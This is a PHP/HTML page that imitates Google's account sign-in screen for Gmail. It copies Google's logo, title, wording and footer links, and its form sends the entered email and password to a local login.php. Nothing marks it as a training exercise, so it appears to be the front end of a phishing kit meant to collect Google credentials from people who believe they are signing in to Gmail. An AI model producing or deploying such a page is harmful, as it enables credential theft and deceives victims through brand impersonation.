<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Sign in – Google Accounts</title>
  <link rel="stylesheet" href="style.php" />
</head>
<body>
  <div class="container">
    <div class="login-box">
      <img src="https://ssl.gstatic.com/accounts/ui/logo_2x.png" alt="Google Logo" class="logo" />

      <h2>Login</h2>
      <p class="subtitle">to continue to Gmail</p>

      <?php if (isset($_GET['error'])): ?>
        <div class="error-msg"><?= htmlspecialchars($_GET['error']) ?></div>
      <?php endif; ?>

      <form action="login.php" method="POST" autocomplete="off">
        <input type="text" name="username" placeholder="Email or phone" required />
        <input type="password" name="password" placeholder="Enter your password" required />
        <button type="submit">Next</button>
      </form>

      <div class="links">
        <a href="#">Forgot email?</a>
      </div>

      <div class="signup">
        <p>Not your computer? Use Guest mode to sign in privately.</p>
        <a href="#">Learn more</a>
      </div>

      <div class="create-account">
        <a href="#">Create account</a>
      </div>
    </div>

    <footer>
      <div class="footer-links">
	<a href="#">Advertising</a>
	<a href="#">Business</a>
	<a href="#">How Search works</a>
        <a href="#">Privacy</a>
        <a href="#">Terms</a>
	<a href="#">Settings</a>
      </div>
    </footer>
  </div>
</body>
</html>

